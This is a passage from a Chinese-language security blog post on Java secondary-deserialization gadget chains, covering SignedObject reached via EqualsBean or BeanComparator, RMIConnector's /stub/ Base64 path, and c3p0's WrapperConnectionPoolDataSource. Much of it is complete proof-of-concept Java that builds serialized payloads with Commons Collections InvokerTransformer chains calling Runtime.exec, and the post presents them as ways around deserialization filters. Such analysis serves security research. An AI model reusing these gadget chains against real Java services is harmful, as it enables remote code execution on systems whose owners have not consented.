class="title class_">SignedObject</span>(hashSet, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;12&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        hashMap1.put(<span class="string">&quot;zZ&quot;</span>, signedObject);</span><br><span class="line">        HashMap&lt;String, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>, signedObject);</span><br><span class="line">        hashMap2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Map&lt;?,?&gt;, Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(hashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(hashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_beanClass</span> <span class="operator">=</span> bean.getClass().getDeclaredField(<span class="string">&quot;_beanClass&quot;</span>);</span><br><span class="line">        _beanClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _beanClass.set(bean, signedObject.getClass());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_obj</span> <span class="operator">=</span> bean.getClass().getDeclaredField(<span class="string">&quot;_obj&quot;</span>);</span><br><span class="line">        _obj.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _obj.set(bean, signedObject);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于要触发<code>EqualsBean.equals()</code>，故不再将HashMap修饰为LazyMap，LazyMap调用<code>equals()</code>需要一个Transformer对象</p><h4 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h4><p>是的，CommonsBeanutils依赖下也可以是触发<code>SignedObject.getObject()</code>的选择，毕竟CB链本身就是依靠调用getter方法实现代码执行的</p><p>所以有Poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">2048</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        SignedObject signedObject=<span class="keyword">new</span> <span class="title class_">SignedObject</span>(hashSet, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line">        beanComparator.setProperty(<span class="string">&quot;object&quot;</span>);</span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; clazzz = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazzz.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(priorityQueue, beanComparator);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> clazzz.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;signedObject, signedObject&#125;);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h3 id="RmiConnector"><a href="#RmiConnector" class="headerlink" title="RmiConnector"></a>RmiConnector</h3><p>该类的二次反序列化触发点在<code>findRMIServerJRMP()</code>方法中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServerJRMP</span><span class="params">(String base64, Map&lt;String, ?&gt; env, <span class="type">boolean</span> isIiop)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// could forbid &quot;iiop:&quot; URL here -- but do we need to?</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] serialized;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取Base字符串转化为数组</span></span><br><span class="line">            serialized = base64ToByteArray(base64);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Bad BASE64 encoding: &quot;</span> +</span><br><span class="line">                    e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> EnvHelp.resolveClientClassLoader(env);</span><br><span class="line">    <span class="comment">//获取对象输入流</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span></span><br><span class="line">                (loader == <span class="literal">null</span>) ?</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin) :</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ObjectInputStreamWithLoader</span>(bin, loader);</span><br><span class="line">        <span class="keyword">final</span> Object stub;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//二次反序列化</span></span><br><span class="line">            stub = oin.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(<span class="string">&quot;Class not found: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (RMIServer)stub;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于该类在<code>readObject()</code>使用原生默认方法，不受自定义<code>loadClass()</code>影响，常用于进行如此的绕过</p><p>调用该方法的上层为<code>findRMIServer()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> RMIServer <span class="title function_">findRMIServer</span><span class="params">(JMXServiceURL directoryURL,</span></span><br><span class="line"><span class="params">            Map&lt;String, Object&gt; environment)</span></span><br><span class="line">            <span class="keyword">throws</span> NamingException, IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isIiop</span> <span class="operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (isIiop) &#123;</span><br><span class="line">            <span class="comment">// Make sure java.naming.corba.orb is in the Map.</span></span><br><span class="line">            environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> directoryURL.getURLPath();</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> path.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (end &lt; <span class="number">0</span>) end = path.length();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/jndi/&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> findRMIServerJNDI(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/stub/&quot;</span>))</span><br><span class="line">            <span class="comment">//上层方法调用处</span></span><br><span class="line">            <span class="keyword">return</span> findRMIServerJRMP(path.substring(<span class="number">6</span>,end), environment, isIiop);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/ior/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!IIOPHelper.isAvailable())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;iiop protocol not available&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> findRMIServerIIOP(path.substring(<span class="number">5</span>,end), environment, isIiop);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;or /ior/: &quot;</span> + path;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MalformedURLException</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有个条件是<code>path</code>需要以<code>/stub/</code>开头，而<code>path</code>截断前6个字符剩下的内容则作为<code>findRMIServerJRMP()</code>的形参<code>base64</code>传入</p><p>由于要找到<code>directoryURL</code>的来源，继续找到上层<code>connnect()</code>方法，该方法说明<code>directoryURL</code>来自字段<code>jmxServiceURL</code></p><p><img src="/img/post/image-20260201232500909.png" alt="image-20260201232500909"></p><p>这个<code>connect()</code>是有参方法，其实还有一个无参公开重载方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        connect(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>无参的特点可以在<code>loadClass()</code>执行一次代码时指向该方法，最终造成二次反序列化</p><p>回到刚才，<code>jmxServiceURL</code>是一个<code>JMXServiceURL</code>实例，前面对其调用<code>getURLPath()</code>其实是取出了其<code>urlPath</code>字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getURLPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> urlPath;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>urlPath</code>为字符串类型，只要我们能够控制其以<code>/stub/</code>开头并接上要加载类的字节码Base64编码，就能触发二次反序列化</p><p>至于<code>urlPath</code>的格式，在<code>JMXServiceURL</code>的构造方法中</p><p><img src="/img/post/image-20260201233459816.png" alt="image-20260201233459816"></p><p>要求以<code>service:jmx:</code>开头，除此以外</p><p><img src="/img/post/image-20260201234048086.png" alt="image-20260201234048086"></p><p>还要求前缀后接一个<code>协议名://</code>的格式，如<code>rmi://</code></p><p>但其实后面给<code>urlPath</code>赋值把前面都截断了，但是为了避免抛出异常，还是需要依照格式来</p><p><img src="/img/post/image-20260201234516570.png" alt="image-20260201234516570"></p><p>所以前半段的Poc</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlPath</span> <span class="operator">=</span> jmxServiceURL.getClass().getDeclaredField(<span class="string">&quot;urlPath&quot;</span>);</span><br><span class="line">        urlPath.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlPath.set(jmxServiceURL, <span class="string">&quot;/stub/&#123;Base64EncodeString&#125;&quot;</span>);</span><br><span class="line">        RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;twiceUnserialize.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试发现能够走到<code>findRMIServerJRMP()</code>方法</p><p><img src="/img/post/image-20260202001445246.png" alt="image-20260202001445246"></p><br/><h3 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h3><p>该类为c3p0依赖下的类，由于该类的触发需要setter方法，一般配合jackson或fastjson来利用</p><p>该类在创建时设置了一个<code>PropertyListener</code>属性监听器，当类中的字段发生变化时，该监听器会触发一定行为</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WrapperConnectionPoolDataSource</span><span class="params">(<span class="type">boolean</span> autoregister)</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">super</span>( autoregister );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置了属性监听器</span></span><br><span class="line">setUpPropertyListeners();</span><br><span class="line"></span><br><span class="line"><span class="comment">//set up initial value of userOverrides</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">    &#123; <span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( <span class="built_in">this</span>.getUserOverridesAsString() ); &#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">    logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + <span class="built_in">this</span>.getUserOverridesAsString(), e );</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该监听器的运行方法<code>vetoableChange()</code>，可见当属性名等同于<code>userOverridesAsString</code>时，会进入一个else分支</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">vetoableChange</span><span class="params">( PropertyChangeEvent evt )</span> <span class="keyword">throws</span> PropertyVetoException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> evt.getPropertyName();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">val</span> <span class="operator">=</span> evt.getNewValue();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">&quot;connectionTesterClassName&quot;</span>.equals( propName ) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123; recreateConnectionTester( (String) val ); &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( Exception e )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to create ConnectionTester of class &quot;</span> + val, e );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Could not instantiate connection tester class with name &#x27;&quot;</span> + val + <span class="string">&quot;&#x27;.&quot;</span>, evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;userOverridesAsString&quot;</span>.equals( propName ))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123; WrapperConnectionPoolDataSource.<span class="built_in">this</span>.userOverrides = C3P0ImplUtils.parseUserOverridesAsString( (String) val ); &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, e );</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyVetoException</span>(<span class="string">&quot;Failed to parse stringified userOverrides. &quot;</span> + val, evt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分支中的<code>C3P0ImplUtils.parseUserOverridesAsString()</code>传入的<code>val</code>为对应字段名的值，进入该方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">( String userOverridesAsString )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line"><span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(HASM_HEADER.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line"><span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii( hexAscii );</span><br><span class="line"><span class="keyword">return</span> Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法中将一个16进制字符串<code>userOverridesAsString</code>转化为了字节数组，转化前16进制字符串扣除了前缀和最后一个字符，前缀<code>HASM_HEADER</code>为常量<code>HexAsciiSerializedMap</code>，进入<code>SerializableUtils.fromByteArray()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var1</span> <span class="operator">=</span> deserializeFromByteArray(var0);</span><br><span class="line">        <span class="keyword">return</span> var1 <span class="keyword">instanceof</span> IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>deserializeFromByteArray()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> 